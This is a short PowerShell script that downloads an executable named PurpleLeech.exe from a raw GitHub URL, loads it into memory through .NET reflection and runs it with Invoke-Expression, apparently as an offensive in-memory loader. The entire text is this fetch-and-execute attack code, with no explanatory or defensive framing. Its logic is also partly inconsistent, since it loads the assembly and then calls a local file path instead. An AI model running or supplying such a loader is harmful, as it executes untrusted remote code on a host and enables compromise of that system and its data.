$psexecUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/PurpleLeech.exe"

$psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content


$psExecAssembly = [System.Reflection.Assembly]::Load($psexecBytes)


$scriptBlock = [scriptblock]::Create(".\\PurpleLeech.exe")


$psExecCommand = "$scriptBlock"
Invoke-Expression -Command $psExecCommand